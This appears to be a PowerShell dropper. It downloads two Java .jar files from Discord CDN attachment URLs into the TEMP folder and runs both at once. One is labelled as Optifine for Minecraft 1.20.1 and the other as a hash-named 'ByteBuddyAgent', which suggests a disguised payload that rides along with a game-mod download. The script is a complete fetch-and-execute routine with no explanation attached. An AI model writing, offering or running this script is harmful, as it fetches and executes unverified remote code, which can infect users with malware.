$source = "https://cdn.discordapp.com/attachments/1072597055060594738/1128365821605986436/Optifine1.20.1.jar"
$destination = "$env:TEMP\Optifine1.20.1.jar"
Invoke-WebRequest -Uri $source -OutFile $destination

$source = "https://cdn.discordapp.com/attachments/1072597055060594738/1128353961347387453/ByteBuddyAgent_ae832029342a99e39939c9340.jar"
$destination = "$env:TEMP\ByteBuddyAgent_ae832029342a99e39939c9340.jar"
Invoke-WebRequest -Uri $source -OutFile $destination

cd $env:TEMP
start .\Optifine1.20.1.jar
start .\ByteBuddyAgent_ae832029342a99e39939c9340.jar
